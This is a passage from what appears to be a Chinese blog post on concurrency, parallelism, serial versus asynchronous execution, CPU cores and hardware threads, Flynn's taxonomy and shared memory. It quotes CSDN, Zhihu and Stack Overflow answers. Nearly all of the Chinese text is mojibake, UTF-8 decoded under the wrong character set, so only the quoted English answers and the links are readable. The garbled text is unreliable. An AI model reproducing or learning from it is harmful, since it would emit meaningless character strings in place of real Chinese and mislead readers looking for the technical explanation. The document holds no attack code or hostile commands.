CPUèµ„æºï¼Œå¯ä»¥åŒæ—¶è¿›è¡Œï¼Œè¿™ç§æ–¹å¼æˆ‘ä»¬ç§°ä¹‹ä¸ºå¹¶è¡Œ(Parallel)ã€‚</code></pre><p>å¹¶å‘å’Œå¹¶è¡Œ</p><pre><code>å¹¶å‘å’Œå¹¶è¡Œæ˜¯å³ç›¸ä¼¼åˆæœ‰åŒºåˆ«çš„ä¸¤ä¸ªæ¦‚å¿µï¼Œå¹¶è¡Œæ˜¯æŒ‡ä¸¤ä¸ªæˆ–è€…å¤šä¸ªäº‹ä»¶åœ¨åŒä¸€æ—¶åˆ»å‘ç”Ÿï¼›è€Œå¹¶å‘æ˜¯æŒ‡ä¸¤ä¸ªæˆ–å¤šä¸ªäº‹ä»¶åœ¨åŒä¸€æ—¶é—´é—´éš”å†…å‘ç”Ÿã€‚åœ¨å¤šé“ç¨‹åºç¯å¢ƒä¸‹ï¼Œå¹¶å‘æ€§æ˜¯æŒ‡åœ¨ä¸€æ®µæ—¶é—´å†…å®è§‚ä¸Šæœ‰å¤šä¸ªç¨‹åºåœ¨åŒæ—¶è¿è¡Œï¼Œä½†åœ¨å•å¤„ç†æœºç³»ç»Ÿä¸­ï¼Œæ¯ä¸€æ—¶åˆ»å´ä»…èƒ½æœ‰ä¸€é“ç¨‹åºæ‰§è¡Œï¼Œæ•…å¾®è§‚ä¸Šè¿™äº›ç¨‹åºåªèƒ½æ˜¯åˆ†æ—¶åœ°äº¤æ›¿æ‰§è¡Œã€‚å€˜è‹¥åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­æœ‰å¤šä¸ªå¤„ç†æœºï¼Œåˆ™è¿™äº›å¯ä»¥å¹¶å‘æ‰§è¡Œçš„ç¨‹åºä¾¿å¯è¢«åˆ†é…åˆ°å¤šä¸ªå¤„ç†æœºä¸Šï¼Œå®ç°å¹¶è¡Œæ‰§è¡Œï¼Œå³åˆ©ç”¨æ¯ä¸ªå¤„ç†æœºæ¥å¤„ç†ä¸€ä¸ªå¯å¹¶å‘æ‰§è¡Œçš„ç¨‹åºï¼Œè¿™æ ·ï¼Œå¤šä¸ªç¨‹åºä¾¿å¯ä»¥åŒæ—¶æ‰§è¡Œã€‚</code></pre><p>3.ä¸²è¡Œã€å¹¶è¡Œï¼š</p><pre><code>   å¹¶è¡Œå’Œä¸²è¡ŒæŒ‡çš„æ˜¯ä»»åŠ¡çš„æ‰§è¡Œæ–¹å¼ã€‚ä¸²è¡Œæ˜¯æŒ‡å¤šä¸ªä»»åŠ¡æ—¶ï¼Œå„ä¸ªä»»åŠ¡æŒ‰é¡ºåºæ‰§è¡Œï¼Œå®Œæˆä¸€ä¸ªä¹‹åæ‰èƒ½è¿›è¡Œä¸‹ä¸€ä¸ªã€‚å¹¶è¡ŒæŒ‡çš„æ˜¯å¤šä¸ªä»»åŠ¡å¯ä»¥åŒæ—¶æ‰§è¡Œï¼Œå¼‚æ­¥æ˜¯å¤šä¸ªä»»åŠ¡å¹¶è¡Œçš„å‰ææ¡ä»¶ã€‚</code></pre><p>4.åŒæ­¥ã€å¼‚æ­¥ï¼š</p><pre><code>     æŒ‡çš„æ˜¯èƒ½å¦å¼€å¯æ–°çš„çº¿ç¨‹ã€‚åŒæ­¥ä¸èƒ½å¼€å¯æ–°çš„çº¿ç¨‹ï¼Œå¼‚æ­¥å¯ä»¥ã€‚     å¼‚æ­¥ï¼šå¼‚æ­¥å’ŒåŒæ­¥æ˜¯ç›¸å¯¹çš„ï¼ŒåŒæ­¥å°±æ˜¯é¡ºåºæ‰§è¡Œï¼Œæ‰§è¡Œå®Œä¸€ä¸ªå†æ‰§è¡Œä¸‹ä¸€ä¸ªï¼Œéœ€è¦ç­‰å¾…ã€åè°ƒè¿è¡Œã€‚å¼‚æ­¥å°±æ˜¯å½¼æ­¤ç‹¬ç«‹,åœ¨ç­‰å¾…æŸäº‹ä»¶çš„è¿‡ç¨‹ä¸­ç»§ç»­åšè‡ªå·±çš„äº‹ï¼Œä¸éœ€è¦ç­‰å¾…è¿™ä¸€äº‹ä»¶å®Œæˆåå†å·¥ä½œã€‚çº¿ç¨‹å°±æ˜¯å®ç°å¼‚æ­¥çš„ä¸€ä¸ªæ–¹å¼ã€‚å¼‚æ­¥æ˜¯è®©è°ƒç”¨æ–¹æ³•çš„ä¸»çº¿ç¨‹ä¸éœ€è¦åŒæ­¥ç­‰å¾…å¦ä¸€çº¿ç¨‹çš„å®Œæˆï¼Œä»è€Œå¯ä»¥è®©ä¸»çº¿ç¨‹å¹²å…¶å®ƒçš„äº‹æƒ…ã€‚     å¼‚æ­¥å’Œå¤šçº¿ç¨‹å¹¶ä¸æ˜¯ä¸€ä¸ªåŒç­‰å…³ç³»,å¼‚æ­¥æ˜¯æœ€ç»ˆç›®çš„,å¤šçº¿ç¨‹åªæ˜¯æˆ‘ä»¬å®ç°å¼‚æ­¥çš„ä¸€ç§æ‰‹æ®µã€‚å¼‚æ­¥æ˜¯å½“ä¸€ä¸ªè°ƒç”¨è¯·æ±‚å‘é€ç»™è¢«è°ƒç”¨è€…,è€Œè°ƒç”¨è€…ä¸ç”¨ç­‰å¾…å…¶ç»“æœçš„è¿”å›è€Œå¯ä»¥åšå…¶å®ƒçš„äº‹æƒ…ã€‚å®ç°å¼‚æ­¥å¯ä»¥é‡‡ç”¨å¤šçº¿ç¨‹æŠ€æœ¯æˆ–åˆ™äº¤ç»™å¦å¤–çš„è¿›ç¨‹æ¥å¤„ç†ã€‚</code></pre><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/qq/_26442553/article/details/78729793">https://blog.csdn.net/qq\_26442553/article/details/78729793</a></p><p>å†æ”¾å‡ å¼ å›¾æ¥ç›´è§‚å½¢è±¡çš„è¡¨ç°ä¸€ä¸‹</p><p>01 ä¸²è¡Œ</p><p>ä¸²è¡Œï¼ˆ Sequential ï¼‰ç®€å•æ¥è¯´å°±æ˜¯ä¸€æ¬¡åªèƒ½åšä¸€ä»¶äº‹æƒ…ï¼Œè€Œä¸”è¿˜å¾—æŒ‰ç…§é¡ºåºä¾æ¬¡æ‰§è¡Œï¼Œåé¢çš„ä»£ç æ®µå¿…é¡»ç­‰åˆ°å‰é¢ä»£ç æ®µçš„ä»»åŠ¡æ‰§è¡Œå®Œæ¯•åæ‰èƒ½æ‰§è¡Œã€‚</p><p><img src="https://img-blog.csdnimg.cn/2020071123450489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tpbmdjb2Rpbmc=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‡è®¾æˆ‘ä»¬ç›®å‰ç»è´¹æœ‰é™ï¼Œåªæœ‰ä¸€åå·¥äººï¼Œå·¥äººæ²¡æœ‰ä¸‰å¤´å…­è‡‚ï¼Œå› æ­¤ä»–éœ€è¦ä¸€ä»¶æ¥ç€ä¸€ä»¶æ¥å®Œæˆä»»åŠ¡ï¼Œåªæœ‰å®Œæˆä¸€ä»¶ä»»åŠ¡åæ‰èƒ½å»å®Œæˆä¸‹ä¸€ä»¶ä»»åŠ¡ã€‚</p><p>æ­¤æ—¶å®Œæˆæ€»ä½“è£…ä¿®å·¥ç¨‹ï¼Œä¸€å…±éœ€è¦èŠ±è´¹ 2 + 1 + 3 = 6 å¤©çš„æ—¶é—´<br>02 å¹¶è¡Œ</p><p>å¹¶è¡Œï¼ˆ parallelism ï¼‰æŒ‡çš„æ˜¯åœ¨åŒä¸€æ—¶åˆ»ï¼Œä»»åŠ¡å¯ä»¥åŒæ—¶å¼€å§‹è¿›è¡Œï¼Œå½¼æ­¤ä¹‹é—´æ²¡æœ‰ä¾èµ–å…³ç³»ã€‚æ•´ä¸ªå‘¨æœŸçš„æ€»è€—æ—¶å–å†³äºè€—æ—¶æœ€é•¿çš„é‚£ä»¶äº‹æƒ…æ‰€éœ€çš„æ—¶é—´ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200711234514195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tpbmdjb2Rpbmc=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‡è®¾æˆ‘ä»¬ç›®å‰ç»è´¹æ¯”è¾ƒå……è¶³ï¼Œé›‡ä½£äº†ä¸‰åå·¥äººã€‚è£…ä¿®å·¥ç¨‹çš„å­ä»»åŠ¡ä¹‹é—´æ²¡æœ‰ä¾èµ–å…³ç³»ï¼Œå› æ­¤å·¥äººä»¬å¯ä»¥å¯¹å¢™ä½“æ‹†è¿ã€å®‰è£…æ°´ç”µçº¿ã€ç²‰åˆ·é“ºåœ°æ¿è¿™ä¸‰ä»¶äº‹æƒ…åŒæ—¶å¼€å·¥ï¼Œæ¯ä¸€åå·¥äººè´Ÿè´£ä¸€ä»¶ä»»åŠ¡ã€‚</p><p>æ­¤æ—¶å®Œæˆæ€»ä½“è£…ä¿®å·¥ç¨‹ï¼Œæ€»è€—æ—¶å–å†³äºè€—æ—¶æœ€é•¿çš„é‚£ä»¶äº‹æƒ…ï¼ˆåœ¨è¿™é‡Œå°±æ˜¯ç²‰åˆ·ã€é“ºåœ°æ¿ï¼‰æ‰€éœ€çš„æ—¶é—´ï¼Œå› æ­¤ä¸€å…±éœ€è¦èŠ±è´¹ 3 å¤©çš„æ—¶é—´<br>03 å¹¶å‘</p><p>å¹¶å‘ï¼ˆ concurrency ï¼‰æ˜¯ä»¥äº¤æ›¿çš„æ–¹å¼åˆ©ç”¨ç­‰å¾…æŸä»¶äº‹æƒ…å®Œæˆçš„æ—¶é—´æ¥åšå…¶ä»–äº‹æƒ…ã€‚æ•´ä¸ªå‘¨æœŸçš„æ€»è€—æ—¶ï¼šåœ¨ä¸€ä»¶ä»»åŠ¡ç­‰å¾…æ—¶é—´å†…ï¼ŒèŠ‚çœè¿™æ®µç­‰å¾…æ—¶é—´æ¥å®Œæˆå¦ä¸€ä»¶ä»»åŠ¡ã€‚</p><h6 id><a href="#" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/20200711234524559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tpbmdjb2Rpbmc=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></h6><p>å‡è®¾æˆ‘ä»¬ç›®å‰ç»è´¹ä¸å……è¶³ï¼Œåªèƒ½é›‡ä½£äº†ä¸€åå·¥äººã€‚ä»”ç»†å¯¹ç²‰åˆ·ã€é“ºåœ°æ¿è¿™ä»¶ä»»åŠ¡è¿›è¡Œåˆ†æï¼Œå‘ç°å®ƒå…¶å®åŒ…å«ä¸¤éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯è¿›è¡Œç²‰åˆ·å¢™å£ã€é“ºåœ°æ¿ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯è¿›è¡Œé£å¹²ï¼Œåˆ†åˆ«èŠ±è´¹ 2 å¤©å’Œ 1 å¤©çš„æ—¶é—´ã€‚</p><p>ç²‰åˆ·ã€é“ºåœ°æ¿=ç²‰åˆ·å¢™å£ã€é“ºåœ°æ¿ï¼ˆ 2 å¤©ï¼‰+ é£å¹²ï¼ˆ 1 å¤©ï¼‰</p><p>åœ¨ç­‰å¾…æˆ¿å±‹é£å¹²çš„æ—¶å€™ï¼Œå·¥äººæ­¤æ—¶å¯ä»¥å»å®Œæˆå…¶ä»–çš„ä»»åŠ¡ä»¥èŠ‚çœæ—¶é—´ã€‚</p><p>åœ¨ç¬¬ä¸‰å¤©çš„æ—¶å€™ï¼Œä»å®è§‚è§’åº¦æ¥çœ‹ï¼Œå·¥äººåŒæ—¶åšäº†ä¸¤ä»¶äº‹æƒ…ï¼Œä½†æ˜¯å¾®è§‚çš„è§’åº¦æ¥çœ‹ï¼Œå·¥äººæ²¡æœ‰ä¸‰å¤´å…­è‡‚ï¼Œå…¶å®ä»–åªåœ¨è¿›è¡Œå®‰è£…æ°´ç”µçº¿çš„å·¥ä½œã€‚</p><p>æ­¤æ—¶å®Œæˆæ€»ä½“è£…ä¿®å·¥ç¨‹ï¼Œä¸€å…±éœ€è¦èŠ±è´¹ 5 å¤©çš„æ—¶é—´ã€‚<br>04 å¹¶è¡Œ VS å¹¶å‘</p><p><img src="https://img-blog.csdnimg.cn/20200711234531486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tpbmdjb2Rpbmc=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ ¹æ®CPUå¤šè·¯å¤ç”¨çš„åŸåˆ™ï¼Œä¼šå°†CPUçš„æ‰§è¡Œæ—¶é—´åˆ‡åˆ†æˆå¾ˆå¤šç»†å¾®çš„CPUæ—¶é—´ç‰‡ï¼Œä¸€ä¸ªCPUåœ¨åŒä¸€æ—¶é—´åªèƒ½å®Œæˆä¸€ä»¶ä»»åŠ¡ã€‚</p><p>å¯¹äºå•æ ¸CPUï¼Œå½“é¢å¯¹å¤šä¸ªä»»åŠ¡çš„æ—¶å€™ï¼Œæ¯ä¸ªå°æ—¶é—´ç‰‡ä¼šæ‰§è¡Œä¸€ä¸ªæ“ä½œï¼Œå¤šä¸ªæ“ä½œä¹‹é—´å¿«é€Ÿåˆ‡æ¢æ‰§è¡Œï¼Œé€ æˆäº†åŒæ—¶è¿è¡Œçš„å‡è±¡ã€‚å…¶å®CPUåœ¨ä¸€ä¸ªæ—¶é—´ç‰‡å†…è¿è¡ŒæŸä¸€ä¸ªçº¿ç¨‹æ—¶ï¼Œå…¶å®ƒçº¿ç¨‹å¤„äºæŒ‚èµ·çŠ¶æ€ï¼Œè¿™ç§æ–¹å¼æˆ‘ä»¬ç§°ä¹‹ä¸ºå¹¶å‘ã€‚</p><p>å½“ç³»ç»Ÿæœ‰ä¸€ä¸ªä»¥ä¸Š CPU æ—¶ï¼Œåˆ™çº¿ç¨‹çš„æ“ä½œå¯ä»¥å¹¶è¡Œå¼€å§‹ã€‚å½“ä¸€ä¸ª CPU æ‰§è¡Œä¸€ä¸ªçº¿ç¨‹æ—¶ï¼Œå¦ä¸€ä¸ª CPU å¯ä»¥æ‰§è¡Œå¦ä¸€ä¸ªçº¿ç¨‹ï¼Œä¸¤ä¸ªçº¿ç¨‹äº’ä¸æŠ¢å  CPU èµ„æºï¼Œä»–ä»¬åŒæ—¶è¿›è¡Œï¼Œè¿™ç§æ–¹å¼æˆ‘ä»¬ç§°ä¹‹ä¸ºå¹¶è¡Œã€‚</p><p>å¹¶å‘çš„å‡ºç°ï¼Œæ¯”ä¼ ç»Ÿä¸²è¡Œç³»ç»Ÿæé«˜æ•ˆç‡ä¸æ—¶é—´ï¼Œä½†å¸¦æ¥äº†é¢å¤–æ€§èƒ½å¼€é”€ï¼Œå¦‚ï¼šç³»ç»Ÿè°ƒåº¦å’Œä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚</p><p>å¤šæ ¸CPUä½¿å¹¶è¡Œæˆä¸ºå¯èƒ½ï¼Œå¤§å¤§æé«˜äº†å¤„ç†èƒ½åŠ›ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/kingcoding/article/details/107293131">https://blog.csdn.net/kingcoding/article/details/107293131</a></p><p>è¿˜æœ‰çŸ¥ä¹ä¸€ä½ç­”å‹ç”¨çš„è·‘æ­¥çš„ä¾‹å­</p><pre><code>è¯´ä¸ªè·‘æ­¥çš„ä¾‹å­ï¼šå¼‚æ­¥ï¼šè®­ç»ƒçš„æ—¶å€™ï¼Œè¿åŠ¨å‘˜åœ¨å„è‡ªçš„è·‘é“ä¸Šè·‘è‡ªå·±çš„æ­¥å¤šçº¿ç¨‹ï¼šæœ‰å¾ˆå¤šæ¡è·‘é“ï¼Œè¿åŠ¨å‘˜çœ‹åˆ°å“ªé‡Œæœ‰ç©ºçš„è·‘é“å°±å»è·‘å¹¶è¡Œï¼šä¸¤äººä¸‰è¶³è·‘æ­¥ï¼Œè¿™ä¸¤ä¸ªäººå°±æ˜¯å¹¶è¡Œè¡¥å……ï¼šåŒæ­¥ï¼šæ‰€æœ‰è·‘é“åªå‰©ä¸€æ¡çš„æ—¶å€™ï¼Œè¿åŠ¨å‘˜åœ¨ä¸€æ¡è·‘é“ä¸Šè·‘å®Œä¸€ä¸ªåˆ°ä¸€ä¸ªå¹¶å‘ï¼šä¸€ç»„è¿åŠ¨å‘˜ä¸€èµ·è·‘ï¼Œéš”ä¸€æ®µæ—¶é—´åˆ°ä¸‹ä¸€ç»„è¿åŠ¨å‘˜==========åä¸½åˆ†ç•Œçº¿ 2018-03-07æ›´æ–°============å…³ç³»ï¼šåŒæ­¥çš„æ—¶å€™æ— æ³•å¼‚æ­¥ï¼Œä½†å¼‚æ­¥çš„è¿‡ç¨‹ä¸­å¯ä»¥æœ‰åŒæ­¥å¹¶å‘çš„æ‰§è¡Œæ—¶é—´é—´éš”ä¸­ï¼Œä¹Ÿå¯èƒ½ä¼šå˜æˆå¹¶è¡Œ**ä»¥ä¸Šæ˜¯ä¸ªäººç†è§£ï¼Œå¦‚æœ‰é”™è¯¯ï¼Œè¯·å„ä½å¤§ä½¬æŒ‡æ­£ä½œè€…ï¼šå‘µSeveré“¾æ¥ï¼šhttps://www.zhihu.com/question/28550867/answer/236035067</code></pre><h4 id="æˆ‘çš„æ€»ç»“"><a href="#æˆ‘çš„æ€»ç»“" class="headerlink" title="æˆ‘çš„æ€»ç»“:"></a>æˆ‘çš„æ€»ç»“:</h4><p>å…¶å®åœ¨çœ‹è¿™äº›å›ç­”æ—¶ï¼Œæˆ‘åˆè€ƒè™‘äº†å¦å¤–ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ç°åœ¨çš„å¤„ç†å™¨éƒ½æ˜¯æ¯”å¦‚è¯´æˆ‘çš„ç”µè„‘CPU 16core 32thread ä¹Ÿå°±æ˜¯16æ ¸å¿ƒ32çº¿ç¨‹ã€‚è¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿæˆ‘å»å›½å¤–æ‰¾äº†ä¸€ç¯‡æ¯”è¾ƒè¯¦ç»†çš„æ•™ç¨‹é™äºç¯‡å¹…è¿™é‡Œå°±ä¸å¤åˆ¶ç²˜è´´äº†ï¼ˆ<a href="https://phoenixnap.com/kb/single-vs-dual-processors-server%EF%BC%89%E3%80%82%E9%80%9A%E4%BF%97%E7%9A%84%E8%AF%B4%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84core%E5%B0%B1%E6%98%AFCPU%E4%B8%AD%E5%B0%81%E8%A3%85%E7%9A%84%E7%89%A9%E7%90%86%E5%A4%84%E7%90%86%E5%8D%95%E5%85%83%EF%BC%8C%E8%80%8Cthread%E8%A1%A8%E6%98%8E%E6%AF%8F%E4%B8%AA%E6%A0%B8%E5%8F%AF%E4%BB%A5handle%E4%B8%A4%E4%B8%AA%E7%BA%BF%E7%A8%8B%EF%BC%8C%E4%BD%86%E6%98%AF%E5%B9%B6%E9%9D%9E%E5%90%8C%E6%97%B6%EF%BC%8C%E8%80%8C%E6%98%AF%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2%E4%B8%8B%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BF%99%E4%BF%A9thread%E6%B2%A1%E6%B3%95">https://phoenixnap.com/kb/single-vs-dual-processors-serverï¼‰ã€‚é€šä¿—çš„è¯´ï¼Œè¿™é‡Œçš„coreå°±æ˜¯CPUä¸­å°è£…çš„ç‰©ç†å¤„ç†å•å…ƒï¼Œè€Œthreadè¡¨æ˜æ¯ä¸ªæ ¸å¯ä»¥handleä¸¤ä¸ªçº¿ç¨‹ï¼Œä½†æ˜¯å¹¶éåŒæ—¶ï¼Œè€Œæ˜¯å¿«é€Ÿåˆ‡æ¢ä¸‹ï¼Œæ‰€ä»¥è¿™ä¿©threadæ²¡æ³•</a> parallelismã€‚16æ ¸æ¯ä¸ªæ ¸å¯ä»¥æœ‰ä¿©çº¿ç¨‹ã€‚è¡¨æ˜ä¿¡æ¯é€šé“æ€»æ•°æ˜¯32ï¼ˆIf a CPU has six cores with two threads per core, that means there are twelve paths for information to be processed.ï¼‰ã€‚æ–‡ç« ä¸­è¿˜è®²äº†æœ‰å¤šä¸ªç‰©ç†CPUçš„æƒ…å†µï¼Œå› ä¸ºå¾ˆå¤šæœåŠ¡å™¨ä¸»æ¿æ˜¯æ”¯æŒå¤šä¸ªCPUçš„ï¼Œä¸»æ¿æœ‰å¤šä¸ªCPU Socketã€‚æœ‰ç‚¹å¾ˆé‡è¦ï¼Œæ— è®ºCPUå†æ€ä¹ˆé«˜çº§ï¼Œç”¨äº†å•¥æŠ€æœ¯ä»€ä¹ˆè¶…çº¿ç¨‹ä¹‹ç±»çš„ï¼Œä¸€ä¸ªç‰©ç†Coreä¸€æ¬¡å°±æ˜¯åªèƒ½è¿è¡Œä¸€ä¸ªThread</p><p>é‚£ä¹ˆå¯¹äºå¹¶è¡Œï¼Œæˆ‘è®¤ä¸ºå¯ä»¥çœ‹ä½œæ˜¯coreå’Œcoreä¹‹é—´åŒæ—¶è¿è¡Œä¸åŒçš„Threadã€‚å¯¹äºå¹¶å‘åº”è¯¥æ˜¯å¯¹äºä¸€ä¸ªcoreæ¥è¯´çš„ï¼Œä¸€ä¸ªThreadè¿è¡Œä¸€ä¼šåœä¸‹æ¥ï¼Œå¦ä¸€ä¸ªå¼€å§‹è¿è¡Œï¼Œä»¥æ­¤è½®æ›¿ã€‚ å¯¹äºä¸²è¡Œæœ‰ç‚¹åƒå¹¶å‘ï¼Œä½†æ˜¯ä¸åƒå¹¶å‘é‚£æ ·çµæ´»ï¼Œå¿…é¡»å®Œå…¨æå®šä¸€ä¸ªThreadæ‰èƒ½æä¸‹ä¸€ä¸ªThreadã€‚å¯¹äºåŒæ­¥å’Œå¼‚æ­¥ï¼Œè¿™ä¸¤ä¸ªåº”è¯¥æ˜¯ä¸€ç§æ¨¡å‹ï¼Œå¯¹äºåŒæ­¥æ¥è¯´ï¼Œå…·ä½“çš„ä¾‹å­å°±æ˜¯ï¼ˆä¹Ÿæ˜¯å‚è€ƒçš„ï¼‰å»é¤å…ç‚¹èœï¼ŒåŒæ­¥å°±æ˜¯ä¸€æ¡Œç‚¹å®Œä¸‹æ¡Œå»ç‚¹ï¼Œå¼‚æ­¥å°±æ˜¯Aæ¡Œç‚¹äº†ä¸€ä¸ªèœï¼Œåå¨å»åšï¼ŒBæ¡Œä¹Ÿç‚¹äº†ä¸€ä¸ªèœï¼Œåå¨å»åšâ€¦.å…¶å…·ä½“å®ç°å°±æ˜¯å¹¶å‘</p><p>ç„¶åå…¶å®æˆ‘åˆæƒ³åˆ°ä¸€ä¸ªé—®é¢˜é‚£å°±æ˜¯ï¼ŒCPUçš„Threadå’Œè½¯ä»¶é‡Œé¢çš„Threadæ˜¯æ€æ ·çš„å…³ç³»ã€‚å¥½å®¶ä¼™ä¸€æœåˆå‡ºæ¥ä¸€å †ï¼Œè´´ä¸€ä¸ªStackOverFlowçš„å›ç­”å§</p><pre><code class="STATA">Q:What is the difference between software threads, hardware threads and java threads?Are software threads, java threads and hardware threads independent or interdependent? I am asking this because, I know Java threads are created inside a process with in jvm (java.exe).Also is it true that these different process are executed on different hardware threads?A:A &quot;hardware thread&quot; is a physical CPU or core. So, a 4 core CPU can genuinely support 4 hardware threads at once - the CPU really is doing 4 things at the same time.One hardware thread can run many software threads. In modern operating systems, this is often done by time-slicing - each thread gets a few milliseconds to execute before the OS schedules another thread to run on that CPU. Since the OS switches back and forth between the threads quickly, it appears as if one CPU is doing more than one thing at once, but in reality, a core is still running only one hardware thread, which switches between many software threads.Modern JVMs map java threads directly to the native threads provided by the OS, so there is no inherent overhead introduced by java threads vs native threads. As to hardware threads, the OS tries to map threads to cores, if there are sufficient cores. So, if you have a java program that starts 4 threads, and have 4 or more cores, there&#39;s a good chance your 4 threads will run truly in parallel on 4 separate cores, if the cores are idle.URL:https://stackoverflow.com/questions/5593328/software-threads-vs-hardware-threadså€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªå›ç­”çš„èµæ˜¯æœ€å¤šçš„ï¼Œä½†æ˜¯æ²¡è¢«é€‰ä¸ºæ ‡å‡†ç­”æ¡ˆã€‚æ ‡å‡†ç­”æ¡ˆå¦‚ä¸‹ï¼ˆæ„Ÿè§‰è¿˜æ˜¯èµå¤šçš„å›ç­”å®¹æ˜“ç†è§£ï¼Œå¯èƒ½æ˜¯æˆ‘æ²¡æ€ä¹ˆäº†è§£Javaçš„ç¼˜æ•…ï¼‰Aï¼šSoftware threads are threads of execution managed by the operating system.Hardware threads are a feature of some processors that allow better utilisation of the processor under some circumstances. They may be exposed to/by the operating system as appearing to be additional cores (&quot;hyperthreading&quot;).In Java, the threads you create maintain the software thread abstraction, where the JVM is the &quot;operating system&quot;. Whether the JVM then maps Java threads to OS threads is the JVM&#39;s business (but it almost certainly does). And then the OS will be using hardware threads if they are available.</code></pre><p>è¿™é‡Œé¢æˆ‘æ³¨æ„åˆ°æåˆ°å‡ ç§Thread,æ‹¿JAVAè¿è¡Œåœ¨JVMæ¥è¯´ï¼Œä»£ç é‡Œçš„Threadæ˜¯ä»£ç Threadï¼Œè¢«JVMæ˜ å°„åˆ°OSçº§Native Threadï¼ŒOSå†æ˜ å°„åˆ°Hardware Threadä¹Ÿå°±æ˜¯CPUæ ¸çš„Threadã€‚</p><h3 id="1-2-è´¹æ—åˆ†ç±»æ³•ï¼ˆFlynnâ€™s-Taxonomyï¼‰"><a href="#1-2-è´¹æ—åˆ†ç±»æ³•ï¼ˆFlynnâ€™s-Taxonomyï¼‰" class="headerlink" title="1-2 è´¹æ—åˆ†ç±»æ³•ï¼ˆFlynnâ€™s Taxonomyï¼‰"></a>1-2 è´¹æ—åˆ†ç±»æ³•ï¼ˆFlynnâ€™s Taxonomyï¼‰</h3><p>è´¹æ—åˆ†ç±»æ³•æ˜¯åˆ†ç±»å¹¶è¡Œè®¡ç®—æœºç³»ç»Ÿæ¶æ„çš„ä¸€ç§æ–¹å¼ã€‚å®ƒåŸºäºï¼ŒInstructionå’ŒData Flowä¸¤ä¸ªæ¦‚å¿µ</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210417005116799-1024x719.png"></p><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210417005342757-1024x341.png"></p><p>SISDä¸»è¦åº”ç”¨äºå¾ˆè€å¼çš„å•æ ¸å¤„ç†å™¨ä¸Šï¼Œåœ¨ç°ä»£æ¶æ„å¤„ç†å™¨ä¸­å·²ç»æ˜¯å¾ˆå°‘è§çš„äº†</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210417013054402-1-1024x538.png"></p><h3 id="1-3-å…±äº«å†…å­˜"><a href="#1-3-å…±äº«å†…å­˜" class="headerlink" title="1-3 å…±äº«å†…å­˜"></a>1-3 å…±äº«å†…å­˜</h3><p>å†çœ‹çœ‹æˆ‘ä»¬æœ€å¸¸ç”¨çš„MIMDæ¶æ„ã€‚ä¸€èˆ¬çš„ç°ä»£CPUéƒ½é‡‡ç”¨è¿™ä¸ªæ¶æ„ã€‚è¯„åˆ¤ä¸€ä¸ªå¹¶è¡Œä½“ç³»ç»“æ„ä¸ä»…è¦çœ‹ç¡¬ä»¶æ¶æ„è¿˜è¦çœ‹å†…å­˜çš„ç»„ç»‡ã€‚å…ˆçœ‹ä¸‹å…±äº«å†…å­˜æ¨¡å‹ã€‚ä¸€ä¸ªå¤„ç†å™¨åœ¨ä¿®æ”¹å‚¨å­˜åœ¨å†…å­˜ç³»ç»Ÿä¸­çš„æ•°æ®æ—¶ï¼Œå¦‚æœå…¶ä»–å¤„ç†å™¨åŒæ—¶ä¹Ÿåœ¨ä½¿ç”¨è¿™ä¸ªæ•°æ®å°±ä¼šå‡ºç°é—®é¢˜ã€‚å·²ç»ä¿®æ”¹çš„æ–°å€¼ä¼šä»å¤„ç†å™¨ç¼“å­˜ä¼ é€’åˆ°å…±äº«å†…å­˜ã€‚ä¸è¿‡ä¹‹åè¿˜å¾—ä¼ é€’åˆ°æ‰€æœ‰CPUçš„ç¼“å­˜ï¼Œä½¿å¾—ä»–ä»¬ä¸ä¼šå¤„ç†è¿‡æ—¶çš„æ•°æ®ã€‚</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210417223722837-1.png"></p><p>è¿™ä¸ªé—®é¢˜ç§°ä¸ºç¼“å­˜ä¸€è‡´æ€§(cache 